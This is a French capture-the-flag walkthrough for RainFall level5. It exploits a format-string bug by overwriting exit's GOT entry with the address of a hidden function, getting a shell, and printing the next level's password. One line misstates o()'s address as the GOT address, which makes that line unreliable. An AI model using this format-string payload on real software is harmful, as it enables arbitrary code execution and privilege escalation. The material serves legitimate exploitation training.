# Level5: FORMAT STRING

#### Première étape — tester le programme

```bash
$ ./level5
a
a
```

Le programme affiche l'entrée.

### Ouvrons le binaire
```s
080484a4 <o>:
 80484a4:	55                   	push   %ebp
 80484a5:	89 e5                	mov    %esp,%ebp
 80484a7:	83 ec 18             	sub    $0x18,%esp
 80484aa:	c7 04 24 f0 85 04 08 	movl   $0x80485f0,(%esp)
 80484b1:	e8 fa fe ff ff       	call   80483b0 <system@plt>
 80484b6:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80484bd:	e8 ce fe ff ff       	call   8048390 <_exit@plt>

080484c2 <n>:
 80484c2:	55                   	push   %ebp
 80484c3:	89 e5                	mov    %esp,%ebp
 80484c5:	81 ec 18 02 00 00    	sub    $0x218,%esp
 80484cb:	a1 48 98 04 08       	mov    0x8049848,%eax
 80484d0:	89 44 24 08          	mov    %eax,0x8(%esp)
 80484d4:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
 80484db:	00 
 80484dc:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484e2:	89 04 24             	mov    %eax,(%esp)
 80484e5:	e8 b6 fe ff ff       	call   80483a0 <fgets@plt>
 80484ea:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484f0:	89 04 24             	mov    %eax,(%esp)
 80484f3:	e8 88 fe ff ff       	call   8048380 <printf@plt>
 80484f8:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80484ff:	e8 cc fe ff ff       	call   80483d0 <exit@plt>

08048504 <main>:
 8048504:	55                   	push   %ebp
 8048505:	89 e5                	mov    %esp,%ebp
 8048507:	83 e4 f0             	and    $0xfffffff0,%esp
 804850a:	e8 b3 ff ff ff       	call   80484c2 <n>
 804850f:	c9                   	leave  
 8048510:	c3                   	ret  
```

Comme les niveaux precedent nous pouvons voir dans la fonction n un printf non proteger suivi d'un **exit()** et la fonction **o()** qui n'est pas appeler dans le main donc nous allons passer dans la section **.got** et ecrasser l'adresse de **exit()** et la remplacer par l'adresse de **o()**.

### Recherchez les adresses.

```bash
level5@RainFall:~$ objdump -R ./level5 

./level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```
> **_exit-adress:** _l'adresse de la fonction exit est 0x08049838_.

```bash
(gdb) p &o
$1 = (<text variable, no debug info> *) 0x80484a4 <o>
```
> _**O-adress:**_ _l'adresse de la fonction **o** est 0x08049838_.

### Trouver l'offset


_**Maintenant nous allons trouver l'offset avec printf comme d'habitude**_

```bash
level5@RainFall:~$ python -c 'print "AAAA" + ".%p"*10' | ./level5 
AAAA.0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70
level5@RainFall:~$ ./level5 
AAAA%4$x
AAAA41414141
```
> **l'offset de printf est le 4ᵉ parametres.**


### Creation du payload

```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824c%4$n"'; cat) | ./level5
```
> adresse cible = \x38\x98\x04\x08 (0x08049838 (exit))
> adresse de remplacement = 134513828 - 4 = 134513824 (0x80484a4(o))

```bash
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

TADA ! 

Bonne chance et have fun :)

